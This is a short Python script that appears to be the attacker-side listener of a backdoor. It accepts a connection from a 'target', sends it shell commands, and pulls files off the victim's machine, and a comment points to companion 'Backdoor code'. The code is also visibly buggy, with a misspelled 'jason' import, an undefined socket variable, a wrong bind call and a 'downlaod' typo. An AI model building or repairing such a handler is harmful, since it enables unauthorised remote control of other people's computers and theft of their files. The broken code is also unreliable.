import socket

import jason

import os

def data_send(data):

    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def data_recv():

    data = ''
    while True:

        try:
            data = data + s.recv(1024).decode().rstrip()
            return jason.loads(data)

        except ValueError:
            continue

def file_upload(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())


def file_download(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)

        except socket.timeout as e:
            break

    s.settimeout(None)
    f.close()

def target_communication():
    while True:
        command = input('$Shell~%s: ' % str(ip))
        data_send(command)
        if command == 'quit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd':
            pass
        elif command[:8] == 'downlaod':
            file_download(command[9:])
        else:
            result = data_recv()
            print(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind('IP', 'Port') # on the place of IP and Port put your system IP and Port you want to connect as you did in Backdoor code.and
print('[+] Listening For the Incoming Connections')
sock.listen(5)
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))
target_communication()